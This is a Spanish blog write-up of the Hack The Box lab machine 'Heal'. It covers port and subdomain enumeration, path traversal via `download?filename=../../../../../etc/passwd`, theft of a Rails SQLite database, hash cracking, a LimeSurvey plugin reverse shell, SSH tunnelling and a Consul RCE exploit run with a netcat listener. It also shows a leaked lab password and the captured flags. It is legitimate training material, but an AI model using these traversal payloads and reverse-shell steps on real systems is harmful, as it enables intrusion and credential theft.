---
title: "Writeup Heal"
header:
  image: /assets/images/posts/heal/featured_image_heal.jpg
  teaser: /assets/images/posts/heal/featured_image_heal.jpg
excerpt_separator: "<!--more-->"
show_date: true
toc: true
toc_sticky: true
share: true
related: true
categories:
  - writeups
  - HackTheBox
tags:
  - Fuzzing
  - Path Traversal
  - Burp Suite
  - Robo de Token
  - Reverse Shell
  - RCE
  - Tunel SSH
  - JohnTheRipper
collection: writeups
---

La máquina **Heal** de **Hack The Box** es una máquina de dificultad intermedia que presenta una combinación de vulnerabilidades web y de configuración. 
<!--more-->

A lo largo de este write-up, detallaré los pasos que seguí para comprometer la máquina, desde la enumeración inicial hasta la escalada de privilegios para obtener acceso root. 

Esta máquina es ideal para practicar ataques de Path Traversal, explotación de APIs, manipulación de bases de datos y la explotación de servicios internos expuestos.

![alt text](/assets/images/posts/heal/Heal.png)

## 1. Escaneo Inicial

Comencé con un escaneo básico para identificar los puertos abiertos en la máquina ojetivo.

```sh
export IP=10.10.11.46 
nmap -Pn $IP    
```

![alt text](/assets/images/posts/heal/image.png)

```sh
sudo nmap -p22,80 -sS -sV -sC $IP -O -oA scan_nmap_Heal
```

![alt text](/assets/images/posts/heal/image-1.png)

```sh
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 
80/tcp open  http    nginx 1.18.0 (Ubuntu)
```

**Resultados del escaneo:**  
- **22/tcp** abierto → OpenSSH 8.9p1 Ubuntu 3ubuntu0.10  
- **80/tcp** abierto → nginx 1.18.0 (Ubuntu)


## 2. Enumeración Web


En la enumeración obtuve los resultados:
- http-server-header: nginx/1.18.0 (Ubuntu)
- http-title: Did not follow redirect to http://heal.htb/ 
Añadí este dominio a mi archivo `/etc/hosts`:

```sh
echo "10.10.11.46 heal.htb" | sudo tee -a /etc/hosts > /dev/null
cat /etc/hosts
```

![alt text](/assets/images/posts/heal/image-2.png)

Comprobe visualmente la web

![alt text](/assets/images/posts/heal/image-3.png)

A continuacion realicé un escaneo con nuclei de la maquina objetivo.

![alt text](/assets/images/posts/heal/image-4.png)

```sh
                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v3.3.5

                projectdiscovery.io

[WRN] Found 4 templates with runtime error (use -validate flag for further examination)
[INF] Current nuclei version: v3.3.5 (outdated)
[INF] Current nuclei-templates version: v10.1.2 (latest)
[WRN] Scan results upload to cloud is disabled.
[INF] New templates added in latest release: 52
[INF] Templates loaded for current scan: 8971
[INF] Executing 8773 signed templates from projectdiscovery/nuclei-templates
[WRN] Loading 198 unsigned templates for scan. Use with caution.
[INF] Targets loaded for current scan: 1
[INF] Templates clustered: 1698 (Reduced 1598 Requests)
[INF] Using Interactsh Server: oast.site
[waf-detect:nginxgeneric] [http] [info] http://10.10.11.46:80
[ssh-server-enumeration] [javascript] [info] 10.10.11.46:22 ["SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.10"]                                                            
[ssh-sha1-hmac-algo] [javascript] [info] 10.10.11.46:22
[ssh-password-auth] [javascript] [info] 10.10.11.46:22
[openssh-detect] [tcp] [info] 10.10.11.46:22 ["SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.10"]                                                                           
[tech-detect:nginx] [http] [info] http://10.10.11.46:80
```

### 2.1 Escaneo de Directorios y Subdominios

Utilicé **gobuster** para buscar directorios comunes:

```sh
gobuster dir -u http://heal.htb -w /usr/share/dirb/wordlists/common.txt
```

![alt text](/assets/images/posts/heal/image-5.png)

Comprobé el fichero robots descubierto por si tuviera informacion sobre directorios o ficheros.

![alt text](/assets/images/posts/heal/image-6.png)

Luego, usé **ffuf** para descubrir subdominios:

```sh
ffuf -u http://heal.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -H 'Host: FUZZ.heal.htb' -fs 178 2>/dev/null
```

![alt text](/assets/images/posts/heal/image-7.png)

Descubrí el subdominio **api.heal.htb** y lo agregué a `/etc/hosts`:

```sh
sudo sed -i '$d' /etc/hosts 
echo "10.10.11.46 heal.htb api.heal.htb" | sudo tee -a /etc/hosts > /dev/null
```

![alt text](/assets/images/posts/heal/image-8.png)

Comprobé que el subdominio nos da informacion sobre la api.

![alt text](/assets/images/posts/heal/image-9.png)

Comprobé si una vez añadido el subdominio de api ya podía crear cuenta con unas credenciales ficticias.

![alt text](/assets/images/posts/heal/image-10.png)

Obtengo acceso a la aplicacion que esta alojada que parece ser un constructor de curriculums opensource.

![alt text](/assets/images/posts/heal/image-11.png)
![alt text](/assets/images/posts/heal/image-12.png)
![alt text](/assets/images/posts/heal/image-13.png)

El boton take survey me condujo a http://take-survey.heal.htb/index.php/552933?lang=en que esta en un subdominio nuevo pero que al no estar en mi lista de hosts no lo resuelve, por lo que lo agregé

```sh
sudo sed -i '$d' /etc/hosts 
echo "10.10.11.46 heal.htb api.heal.htb take-survey.heal.htb" | sudo tee -a /etc/hosts > /dev/null
```

![alt text](/assets/images/posts/heal/image-14.png)

Y al recargar la pagina obtuve acceso al formulario

![alt text](/assets/images/posts/heal/image-15.png)

Comprobé con gobuster este nuevo subdominio

```sh
gobuster dir -u http://take-survey.heal.htb -w /usr/share/dirb/wordlists/common.txt
```

![alt text](/assets/images/posts/heal/image-16.png)

Obtuve los siguientes resultados de los cuales son reseñables:

- **200 OK** /index.php

![alt text](/assets/images/posts/heal/image-17.png)

Conseguí el correo del Administrador del sistema: `ralph@heal.htb`

- **302 Found** /Admin [--> http://take-survey.heal.htb/index.php/admin/authentication/sa/login]

![alt text](/assets/images/posts/heal/image-19.png)

- **401 Unauthorized** /uploader 

![alt text](/assets/images/posts/heal/image-18.png)

### 2.2 Comprobacion de Superficie de ataque web

- **Login en la aplicacion**

![alt text](/assets/images/posts/heal/image-20.png)

![alt text](/assets/images/posts/heal/image-21.png)

![alt text](/assets/images/posts/heal/image-22.png)

Conseguí un token de autorizacion de la api.

```sh
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjo1fQ.7HQbv7vTQa-UIbcu3TPdEgxs3zZG0tYpT-yOC5uxMbM
```

- **Boton de Exportacion PDF**

Este boton hace una llamada a http://api.heal.htb/download?filename= y un valor que es el nombre del fichero a obtener.

![alt text](/assets/images/posts/heal/image-23.png)

![alt text](/assets/images/posts/heal/image-24.png)

## 3. Interacción con la API y Path Traversal

Al interactuar con la API, descubrí que era posible descargar archivos a través del endpoint:

```http
http://api.heal.htb/download?filename=
```

### 3.1 Prueba de Path Traversal

Intenté un ataque de **Path Traversal** 

El Path Traversal es una vulnerabilidad que permite a un atacante acceder a archivos y directorios fuera del directorio raíz de la aplicación web. Esto se logra manipulando las rutas de archivo en las entradas de usuario, como en la URL que descubrí en el boton "**Export as PDF**"

Si intento volver a bajar un archivo directamente desde la barra de direcciones usando la URL: `api.heal.htb/download?filename=ca03ad068f109171bb03.pdf `

![alt text](/assets/images/posts/heal/image-25.png)

Obtengo un error de token invalido.

![alt text](/assets/images/posts/heal/image-26.png)

Usé BurpSuite para modificar la peticion añadiendo la autorizacion de api que obtuve en el login.

Lancé la petición a http://api.heal.htb/download?filename= y la pasé a Repeater

![alt text](/assets/images/posts/heal/image-27.png)

Obtuve como respuesta el error de token invalido.

![alt text](/assets/images/posts/heal/image-28.png)

Llegado a este punto modifique la peticion añadiendole la el token de autorizacion que obtuve anteriormente

```sh
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjo1fQ.7HQbv7vTQa-UIbcu3TPdEgxs3zZG0tYpT-yOC5uxMbM
```

![alt text](/assets/images/posts/heal/image-29.png)

Obtuve que el fichero no ha sido encontrado, ya que no le di valor de fichero. Pero me ha servido para comprobar que el servidor acepta mis peticiones de archivo con el token de autorizacion robado. 

El siguiente paso que realicé fue comprobar si podia acceder a archivos fuera de la carpeta contenedora de la aplicacion web como por ejemplo el archivo `passwd`

Comencé por http://api.heal.htb/download?filename=../../etc/passwd y fui añadiendo subdirectorios hacia arriba.

![alt text](/assets/images/posts/heal/image-30.png)

Con la peticion de http://api.heal.htb/download?filename=../../../../../etc/passwd obtuve acceso a el fichero passwd por lo que el ataque ha tuvo exito.

![alt text](/assets/images/posts/heal/image-31.png)

```textplain
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
ralph:x:1000:1000:ralph:/home/ralph:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
avahi:x:114:120:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
geoclue:x:115:121::/var/lib/geoclue:/usr/sbin/nologin
postgres:x:116:123:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/false
ron:x:1001:1001:,,,:/home/ron:/bin/bash
```

De este fichero obtengo que existen usuarios con capacidad de hacer login:

- root:x:0:0:root:/root:/bin/bash
- ralph:x:1000:1000:ralph:/home/ralph:/bin/bash
- postgres:x:116:123:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
- ron:x:1001:1001:,,,:/home/ron:/bin/bash

La x en la linea del usuario indica que la contraseña está en /etc/shadow, intento acceder a este fichero pero esta protegido y no es legible con mis permisos actuales.

## 4. Explotación de la Base de Datos

## 4.1 Busqueda de archivos de configuracion del servidor

El servidor esta corriendo en ruby on rails.

Realicée una busqueda en Google sobre los archivos de configuracion mas importantes de ruby on rails y encontré lo siguiente:

- **config/database.yml**: contiene todas las configuraciones requeridas por Registro Activo para conectarse a una base de datos.
- **config/secrets.yml**: almacena los datos confidenciales de su aplicación, como las claves de acceso y las contraseñas que se requieren para las API externas.
- **config/routes.rb**: proporciona un mapeo entre a URL y una acción de controlador. Esto se cubre con más detalle en Enrutamiento de Rails.

![alt text](/assets/images/posts/heal/image-32.png)

Comencé la busqueda de estos ficheros para intentar localizar claves hardcodeadas en los ficheros de configuracion.

## 4.1.1 Busqueda del archivo database.yml

Despues de varias pruebas consigo llegar al fichero database.yml en la ruta ../../config/database.yml 

![alt text](/assets/images/posts/heal/image-33.png)

```textplain
# SQLite. Versions 3.8.0 and up are supported.
#   gem install sqlite3
#
#   Ensure the SQLite 3 gem is defined in your Gemfile
#   gem "sqlite3"
#
default: &default
  adapter: sqlite3
  pool: <%= ENV.fetch("RAILS_MAX_THREADS") { 5 } %>
  timeout: 5000

development:
  <<: *default
  database: storage/development.sqlite3

# Warning: The database defined as "test" will be erased and
# re-generated from your development database when you run "rake".
# Do not set this db to the same as development or production.
test:
  <<: *default
  database: storage/test.sqlite3

production:
  <<: *default
  database: storage/development.sqlite3
```

Obtuve que la base de datos se llama `development.sqlite3` y esta almacenado en la carpeta `storage`.

Compruebo si tengo acceso con la ruta `../../storage/development.sqlite3`

![alt text](/assets/images/posts/heal/image-34.png)

Descargué el fichero a mi maquina atacante y comprobé el contenido abriendo la base de datos en sqlite3 y comprobando las tablas que contiene.

```sh
sqlite3 /home/kali/Downloads/development.sqlite3 
.tables
```

![alt text](/assets/images/posts/heal/image-35.png)

Encontré una tabla de usuarios llamada ```users``` y comprobé el contenido.

![alt text](/assets/images/posts/heal/image-36.png)

```sh
sqlite> .mode column
sqlite> .headers on
sqlite> select * from users;
id  email                password_digest                                               created_at                  updated_at                  fullname       username   is_admin
--  -------------------  ------------------------------------------------------------  --------------------------  --------------------------  -------------  ---------  --------
1   ralph@heal.htb       $2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG  2024-09-27 07:49:31.614858  2024-09-27 07:49:31.614858  Administrator  ralph      1       
2   ibl4zquez@email.com  $2a$12$9JqZO5k2ELsnq8ULtTn1uuUyCvENX0xxVNGpa7WySVsnfyqxeIFHe  2025-02-08 20:18:52.433370  2025-02-08 20:18:52.433370  ibl4zqu3z      ibl4zqu3z  0       
sqlite> select username,password_digest from users;
username   password_digest                                             
---------  ------------------------------------------------------------
ralph      $2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG
ibl4zqu3z  $2a$12$9JqZO5k2ELsnq8ULtTn1uuUyCvENX0xxVNGpa7WySVsnfyqxeIFHe

```

Obtuve el hash de la clave del usuario ralph y lo guardé en un fichero para poder trabajar con el.

![alt text](/assets/images/posts/heal/image-37.png)

## 4.1.2 Fuerza bruta con JtR para obtener credenciales de usuario.

Resolví el hash con **JohnTheRipper** y obtuve la clave para el usuario ralph.

![alt text](/assets/images/posts/heal/image-38.png)

Con el las credenciales que he obtenido hice login en el panel de administracion de **take-survey.heal.htb**

![alt text](/assets/images/posts/heal/image-39.png)

![alt text](/assets/images/posts/heal/image-40.png)

Comprobé que la version de LimeSurvey que esta corriendo es la 6.6.4 

![alt text](/assets/images/posts/heal/image-41.png)

## 4.1.3 Explotacion de LimeSurvey

Busque vulnerabilidades conocidas para este entorno en searchsploit sin obtener resultados utiles.

![alt text](/assets/images/posts/heal/image-42.png)

Busque en Google y obtuve un repositorio en Github que contiene una prueba de concepto de RCE para LimeSurvey 6.6.4

![alt text](/assets/images/posts/heal/image-43.png)

![alt text](/assets/images/posts/heal/image-44.png)

Cloné el repositorio a mi maquina para poder trabajar con el

![alt text](/assets/images/posts/heal/image-45.png)

![alt text](/assets/images/posts/heal/image-46.png)

Configuré el fichero revshell.php con la IP de mi maquina.

![alt text](/assets/images/posts/heal/image-47.png)

![alt text](/assets/images/posts/heal/image-48.png)

Comprimí los ficheros `config.xml` y `revshell.php` en un fichero zip llamado `N4s1rl1.zip` con el comando 

```sh
zip -r N4s1rl1.zip config.xml revshell.php
```

![alt text](/assets/images/posts/heal/image-49.png)

El siguiente paso fue navegar al apartado plugins y subir e instalar el fichero zip anterior.

![alt text](/assets/images/posts/heal/image-50.png)

![alt text](/assets/images/posts/heal/image-51.png)

![alt text](/assets/images/posts/heal/image-52.png)

Una vez subido lo activé.

![alt text](/assets/images/posts/heal/image-53.png)

![alt text](/assets/images/posts/heal/image-54.png)

![alt text](/assets/images/posts/heal/image-55.png)

Levanté un listener con netcat en mi maquina atacante a la escucha en el puerto 1234

![alt text](/assets/images/posts/heal/image-56.png)

Y a continuacion navegué a http://take-survey.heal.htb/upload/plugins/N4s1rl1/revshell.php para que se cargase el codigo de shell inversa que conectaria con mi maquina en el puerto 1234. 

![alt text](/assets/images/posts/heal/image-57.png)

En la terminal del listener conseguí una shell a la maquina objetivo.

## 5. Escalada de Privilegios

Navegué hasta la ruta de configuracion de la aplicacion limesurvey en busqueda de archivos de configuracion que tuvieran credenciales hardcodeadas.

```sh
cd var
cd www
cd limesurvey
cd application
cd config
```

En el directorio encontré el fichero `config.php` que contenia la clave del usuario para la base de datos survey.

```sh
cat config.php
```

![alt text](/assets/images/posts/heal/image-58.png)

Comprobé si esta clave (`AdmiDi0_pA$$w0rd`) me daba acceso por ssh para alguno de los usuarios localizados en el sistema: ron o ralph.

![alt text](/assets/images/posts/heal/image-59.png)

Comprobé que podia obtener acceso con el usuario ron por ssh a la maquina objetivo con esas credenciales.

Una vez logado como ron comprobé archivos y encontré la **flag de user**

![alt text](/assets/images/posts/heal/image-60.png)

```sh
4a974a9f66b7afae9fd7ec53aec84eca
```

## 5.1 Post-Explotación y Acceso Root

Enumeré los puertos internos abiertos en la maquina objetivo.

![alt text](/assets/images/posts/heal/image-61.png)

Encontré varios puertos abiertos ademas de los localizados anteriormente como son el 8500,8503,8600, etc.

Creé una conexión SSH a la maquina con el usuario ron y un túnel SSH para redirigir el tráfico local. Aunque el puerto 8500 del servidor no esté abierto al mundo, con esto se podría acceder a él a través del túnel.

El comando para ello es:

```sh
ssh -L 8500:127.0.0.1:8500 ron@heal.htb
```

![alt text](/assets/images/posts/heal/image-62.png)

Una vez tunelizada la conexion intenté acceder via web al puerto a través de http://localhost:8500 y me hizo una redirección a http://localhost:8500/ui/server1/services

![alt text](/assets/images/posts/heal/image-63.png)

![alt text](/assets/images/posts/heal/image-64.png)

Tras ese puerto se esta ejecutando Consul que es una herramienta desarrollada por HashiCorp para la gestión de servicios y redes en infraestructuras distribuida. 

La interfaz web de Consul a menudo corre en http://localhost:8500, como esta pasando en esta maquina. Si está expuesta sin autenticación, puede permitir que un atacante vea información crítica sobre los servicios y la infraestructura. En entornos comprometidos, los atacantes pueden usar túneles SSH (como el que he usado) para acceder a Consul y explorar la infraestructura interna.

Consul en esta maquina corre la version 1.19.2

Comprobé con searchsploit si existia alguna referencia de un exploit conocido para esta version.

```sh
searchsploit Consul
```

![alt text](/assets/images/posts/heal/image-65.png)

Hice una copia del exploit RCE para la version 1 de Consul.

![alt text](/assets/images/posts/heal/image-66.png)

Convertí el exploit de formato txt a un formato de script de python con el comando:

```sh
mv 51117.txt exploit.py
```

![alt text](/assets/images/posts/heal/image-67.png)


Levanté un listener con netcat en mi maquina atacante con el comando

```sh
nc -nvlp 4444
```

Ejecuté el exploit con el comando

```sh
python3 exploit.py localhost 8500 10.10.16.63 4444 0
```

![alt text](/assets/images/posts/heal/image-68.png)

Y en la ventana del listener obtuve una shell con usuario root en la maquina objetivo.

![alt text](/assets/images/posts/heal/image-69.png)

Accedí a la carpeta root y obtuve la **flag de root**

![alt text](/assets/images/posts/heal/image-70.png)

```sh
dcd7a4115a1125300a64eae6ab145ffe
```

¡Máquina **Heal** completada exitosamente! 🎉

![alt text](/assets/images/posts/heal/image-71.png)

https://www.hackthebox.com/achievement/machine/1608403/640